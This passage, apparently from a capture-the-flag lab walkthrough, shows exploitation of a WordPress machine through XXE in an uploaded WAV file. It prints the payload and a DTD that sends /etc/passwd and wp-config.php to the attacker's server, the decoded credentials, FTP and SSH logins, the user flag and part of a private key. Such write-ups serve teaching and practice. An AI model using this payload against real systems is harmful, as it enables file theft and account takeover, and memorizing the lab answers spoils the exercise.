<p class="mb-3">We activate the Python HTTP server in the directory containing the payload by running <code>python3 -m http.server 8080</code>. The moment we upload the <code>payload.wav</code>, we can see GET Requests in our terminal.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.224:8080/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ ls | grep payload.wav
payload.wav
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo vi evil.dtd
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ cat evil.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.224:8080/?p=%file;'>" >
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.228.95 - - [08/Sep/2026 22:59:51] "GET /evil.dtd HTTP/1.1" 200 -
10.129.228.95 - - [08/Sep/2026 22:59:52] "GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
```

<p class="mb-3">Copying the Base64 encoded string after the <code>p=</code> from the HTTP GET request into a file and decoding it gives us the content of <code>/etc/passwd</code> file.</p> 

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo vi content.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ base64 -d content.txt 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

<p class="mb-3">It seems that there is a user named <code>jnelson</code> on the target machine. Another file we need to retrieve is the <code>wp-config.php</code> file, because it contains the Wordpress configuration info. We use the following payload in the updated <code>evil.dtd</code> file:</p>

```XML
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://[YOUR_LOCAL_IP]:8080/?p=%file;'>" >
```

<p class="mb-3">As a recap, our exploitation process is as follows: Create <code>payload.wav</code> and <code>evil.dtd</code> files &gt; Activate Python HTTP server on port 8080 &gt; Upload <code>payload.wav</code> file &gt; Decode the Base64 contents received.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo vi evil.dtd
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.228.95 - - [08/Sep/2026 23:18:58] "GET /evil.dtd HTTP/1.1" 200 -
10.129.228.95 - - [08/Sep/2026 23:18:58] "GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1" 200 -
``` 

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo rm content.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo vi content.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ base64 -d content.txt 
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

<p class="mb-3">Reading the Base64 decoded contents gives us the credentials for the target machine's FTP: <code>metapress.htb</code>:<code>9NYS_ii@FyL_p5M2NvJ</code>.</p>
<p class="mb-5"><strong>Answer:</strong> 9NYS_ii@FyL_p5M2NvJ</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What is the SSH password for the user jnelson on the remote host?</p>
<p class="mb-3">We now attempt FTP login to the target machine. </p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ ftp 10.129.228.95
Connected to 10.129.228.95.
220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
Name (10.129.228.95:root): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32814|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
ftp> cd blog
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||29712|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 metapress.htb metapress.htb      405 Feb  6  2020 index.php
-rw-r--r--   1 metapress.htb metapress.htb    19915 Feb 12  2020 license.txt
-rw-r--r--   1 metapress.htb metapress.htb     7278 Jun 26  2020 readme.html
-rw-r--r--   1 metapress.htb metapress.htb     7101 Jul 28  2020 wp-activate.php
drwxr-xr-x   9 metapress.htb metapress.htb     4096 Oct  5  2022 wp-admin
-rw-r--r--   1 metapress.htb metapress.htb      351 Feb  6  2020 wp-blog-header.php
-rw-r--r--   1 metapress.htb metapress.htb     2328 Oct  8  2020 wp-comments-post.php
-rw-r--r--   1 metapress.htb metapress.htb     2032 Jun 23  2022 wp-config.php
-rw-r--r--   1 metapress.htb metapress.htb     2913 Feb  6  2020 wp-config-sample.php
drwxr-xr-x   6 metapress.htb metapress.htb     4096 Oct  5  2022 wp-content
-rw-r--r--   1 metapress.htb metapress.htb     3939 Jul 30  2020 wp-cron.php
drwxr-xr-x  25 metapress.htb metapress.htb    12288 Oct  5  2022 wp-includes
-rw-r--r--   1 metapress.htb metapress.htb     2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--   1 metapress.htb metapress.htb     3300 Feb  6  2020 wp-load.php
-rw-r--r--   1 metapress.htb metapress.htb    49831 Nov  9  2020 wp-login.php
-rw-r--r--   1 metapress.htb metapress.htb     8509 Apr 14  2020 wp-mail.php
-rw-r--r--   1 metapress.htb metapress.htb    20975 Nov 12  2020 wp-settings.php
-rw-r--r--   1 metapress.htb metapress.htb    31337 Sep 30  2020 wp-signup.php
-rw-r--r--   1 metapress.htb metapress.htb     4747 Oct  8  2020 wp-trackback.php
-rw-r--r--   1 metapress.htb metapress.htb     3236 Jun  8  2020 xmlrpc.php
226 Transfer complete
ftp> cd ../mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||5720|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||2830|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |**********************************************************************************************************|  1126        1.46 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (1.17 KiB/s)
ftp> exit
221 Goodbye.
```

<p class="mb-3">We discovered and downloaded the <code>send_email.php</code> file. Reading it contains the following:</p>

```PHP
?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

<p class="mb-3">Earlier we discovered the user <code>jnelson</code> in the <code>/etc/passwd</code> file. We try to login to the target machine via SSH using the credentials <code>jnelson</code>:</code>Cb4_JmWM8zUZWMu@Ys</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ ssh jnelson@10.129.228.95
jnelson@10.129.228.95's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$ whoami
jnelson
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
```

<p class="mb-5"><strong>Answer:</strong> Cb4_JmWM8zUZWMu@Ys</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> Submit the flag located in the jnelson user's home directory.</p>
<p class="mb-3"></p>

```console
jnelson@meta2:~$ ls -al
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Sep  8 01:39 user.txt
jnelson@meta2:~$ cat user.txt
bbe246ff9a3e9dd3e42368d273b7a741
```

<p class="mb-5"><strong>Answer:</strong> bbe246ff9a3e9dd3e42368d273b7a741</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> Which password manager software is present on the remote host?</p>
<p class="mb-3">Earlier in the SSH session, we listed out all the files and folders in <code>jnelson</code>'s home directory. Notice there is a hidden folder called <code>.passpie</code>. Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface. It uses a master passphrase to decrypt login credentials, copy passwords to clipboard, syncronize with a git repository, check the state of your passwords, and more. Password files are encrypted using GnuPG and saved into yaml text files. Passpie supports Linux, OSX and Windows.</p>
<p class="mb-5"><strong>Answer:</strong> passpie</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> What is the passphrase for the Passpie password manager?</p>
<p class="mb-3">We navigate to and explore the contents of <code>.passpie</code> folder. We see the hidden file called <code>.keys</code>. Reading it contains public and private key blocks.</p>

```console
jnelson@meta2:~$ cd .passpie
jnelson@meta2:~/.passpie$ ls -al
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
jnelson@meta2:~/.passpie$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
